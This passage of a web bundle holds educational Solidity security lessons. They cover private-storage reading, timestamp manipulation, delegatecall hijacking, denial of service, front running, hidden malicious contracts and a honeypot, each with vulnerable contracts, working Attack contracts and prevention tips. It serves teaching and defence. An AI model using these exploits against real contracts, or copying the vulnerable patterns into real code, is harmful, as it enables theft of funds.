class="hljs-title">User</span> {\n        <span class="hljs-keyword">uint</span> id;\n        <span class="hljs-keyword">bytes32</span> password;\n    }\n\n    <span class="hljs-comment">// slot 6 - length of array</span>\n    <span class="hljs-comment">// starting from slot hash(6) - array elements</span>\n    <span class="hljs-comment">// slot where array element is stored = keccak256(slot)) + (index * elementSize)</span>\n    <span class="hljs-comment">// where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))</span>\n    User[] <span class="hljs-keyword">private</span> users;\n\n    <span class="hljs-comment">// slot 7 - empty</span>\n    <span class="hljs-comment">// entries are stored at hash(key, slot)</span>\n    <span class="hljs-comment">// where slot = 7, key = map key</span>\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint</span> =&gt; User) <span class="hljs-keyword">private</span> idToUser;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _password</span>) </span>{\n        password = _password;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addUser</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _password</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        User <span class="hljs-keyword">memory</span> user = User({\n            id: users.<span class="hljs-built_in">length</span>,\n            password: _password\n        });\n\n        users.<span class="hljs-built_in">push</span>(user);\n        idToUser[user.id] = user;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getArrayLocation</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> slot, <span class="hljs-keyword">uint</span> index, <span class="hljs-keyword">uint</span> elementSize</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">uint</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(slot))) + (index * elementSize);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMapLocation</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> slot, <span class="hljs-keyword">uint</span> key</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">uint</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(key, slot)));\n    }\n}\n\n<span class="hljs-comment">/*\nslot 0 - count\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex("111414077815863400510004064629973595961579173665589224203503662149373724986687")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 6 })\n1st user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex("81222191986226809103279119994707868322855741819905904417953092666699096963112")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 1 }, {type: "uint", value: 7})\nuser 1\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829", console.log)\n*/</span></code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t store sensitive information on the blockchain.</li>\n</ul>\n'})};var G=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Block Timestamp Manipulation",description:"An example of a Solidity contract vulnerable to block timestamp manipulation",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>block.timestamp</code> can be manipulated by miners with the following constraints</p>\n<ul>\n<li>it cannot be stamped with an earlier time than its parent</li>\n<li>it cannot be too far in the future</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/</span>\n\n<span class="hljs-comment">/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve&#x27;s block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Roulette</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> pastBlockTime;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">spin</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">10</span> <span class="hljs-literal">ether</span>); <span class="hljs-comment">// must send 10 ether to play</span>\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> != pastBlockTime); <span class="hljs-comment">// only 1 transaction per block</span>\n\n        pastBlockTime = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>;\n\n        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> % <span class="hljs-number">15</span> == <span class="hljs-number">0</span>) {\n            (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);\n            <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n        }\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>block.timestamp</code> for a source of entropy and random number</li>\n</ul>\n'})};var K=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Delegatecall",description:"An example of exploits using delegatecall in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results.</p>\n<p>You must keep 2 things in mind when using <code>delegatecall</code></p>\n<ol>\n<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>\n<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>\n</ol>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nHackMe is a contract that uses delegatecall to execute code.\nIt it is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let&#x27;s see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe&#x27;s storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    Lib <span class="hljs-keyword">public</span> lib;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Lib _lib</span>) </span>{\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n        lib = Lib(_lib);\n    }\n\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {\n        <span class="hljs-keyword">address</span>(lib).<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">data</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> hackMe;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _hackMe</span>) </span>{\n        hackMe = _hackMe;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        hackMe.<span class="hljs-built_in">call</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"pwn()"</span>));\n    }\n}</code></pre>\n<p>Here is another example.</p>\n<p>You will need to understand how Solidity stores\nstate variables before you can understand this exploit.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        someNumber = _num;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _lib</span>) </span>{\n        lib = _lib;\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        lib.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"doSomething(uint256)"</span>, _num));\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    <span class="hljs-comment">// Make sure the storage layout is the same as HackMe</span>\n    <span class="hljs-comment">// This will allow us to correctly update the state variables</span>\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> someNumber;\n\n    HackMe <span class="hljs-keyword">public</span> hackMe;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">HackMe _hackMe</span>) </span>{\n        hackMe = HackMe(_hackMe);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// override address of lib</span>\n        hackMe.doSomething(<span class="hljs-keyword">uint</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))));\n        <span class="hljs-comment">// pass any number as input, the function doSomething() below will</span>\n        <span class="hljs-comment">// be called</span>\n        hackMe.doSomething(<span class="hljs-number">1</span>);\n    }\n\n    <span class="hljs-comment">// function signature must match HackMe.doSomething()</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use stateless <code>Library</code></li>\n</ul>\n'})};var Z=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Denail of Service",description:"An example of denial of service hack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>There are many ways to attack a smart contract to make it unusable.</p>\n<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n<span class="hljs-comment">/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/</span>\n\n<span class="hljs-comment">/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n2. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n3. Deploy Attack with address of KingOfEther.\n4. Call attack with 3 Ether.\n5. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt; balance, <span class="hljs-string">"Need to pay more to become the king"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = king.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> balance}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n\n        balance = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n        king = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{\n    KingOfEther kingOfEther;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">KingOfEther _kingOfEther</span>) </span>{\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    <span class="hljs-comment">// You can also perform a DOS by consuming all gas using assert.</span>\n    <span class="hljs-comment">// This attack wil work even if the calling contract does not check</span>\n    <span class="hljs-comment">// whether the call was successful or not.</span>\n    <span class="hljs-comment">//</span>\n    <span class="hljs-comment">// function () external payable {</span>\n    <span class="hljs-comment">//     assert(false);</span>\n    <span class="hljs-comment">// }</span>\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        kingOfEther.claimThrone{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>\n<p>Here is a example.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt; balance, <span class="hljs-string">"Need to pay more to become the king"</span>);\n\n        balances[king] += balance;\n\n        balance = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n        king = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> != king, <span class="hljs-string">"Current king cannot withdraw"</span>);\n\n        <span class="hljs-keyword">uint</span> amount = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n</code></pre>\n'})};var J=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Front Running",description:"An example of a Solidity contract vulnerable to front running",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Transactions take some time before they are mined. An attacker can watch the transaction pool\nand send a transaction, have it included in a block before the original transaction.\nThis mechanism can be abused to re-order transactions to the attacker&#39;s advantage.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let&#x27;s see how this contract is vulnerable to front running.\n*/</span>\n\n<span class="hljs-comment">/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. ("Ethereum")\n3. Bob calls solve("Ethereum") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob&#x27;s answer and calls solve("Ethereum") with a higher gas price\n   than Bob (100 gwei).\n6. Eve&#x27;s transaction was mined before Bob&#x27;s transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">FindThisHash</span> </span>{\n    <span class="hljs-keyword">bytes32</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> hash =\n      <span class="hljs-number">0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> solution</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(hash == <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(solution)), <span class="hljs-string">"Incorrect answer"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">10</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>use commit-reveal scheme</li>\n<li>use submarine send</li>\n</ul>\n'})};var Q=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Hiding Malicious Code with External Contract",description:"An example of exploit where malicious code is hidden in an external contract in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>In Solidity any address can be casted into specific contract,\neven if the contract at the address is not the one being casted.</p>\n<p>This can be exploited to hide malicious code. Let&#39;s see how.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nLet&#x27;s say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/</span>\n\n<span class="hljs-comment">/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be execute, Mal.log() was executed.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Foo</span> </span>{\n    Bar bar;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _bar</span>) </span>{\n        bar = Bar(_bar);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callBar</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        bar.log();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bar</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"Bar was called"</span>);\n    }\n}\n\n<span class="hljs-comment">// This code is hidden in a separate file</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Mal</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;\n\n    <span class="hljs-comment">// function () external {</span>\n    <span class="hljs-comment">//     emit Log("Mal was called");</span>\n    <span class="hljs-comment">// }</span>\n\n    <span class="hljs-comment">// Actually we can execute the same exploit even if this function does</span>\n    <span class="hljs-comment">// not exit by using the fallback</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"Mal was called"</span>);\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Initialize a new contract inside the constructor</li>\n<li>Make the address of external contract <code>public</code> so that the code of the\nexternal contract can be reviewed</li>\n</ul>\n<pre><code class="language-solidity">Bar <span class="hljs-keyword">public</span> bar;\n\n<span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n    bar = <span class="hljs-keyword">new</span> Bar();\n}</code></pre>\n'})};var $=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Honeypot",description:"An example of honeypot in Solidity",html:'<p>A honeypot is a trap to catch hackers.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>\n<p>that will catch malicious users.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentracy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let&#x27;s see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bank</span> </span>{\n    <span class="hljs-keyword">mapping</span> (<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;\n    Logger logger;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Logger _logger</span>) </span>{\n        logger = Logger(_logger);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span 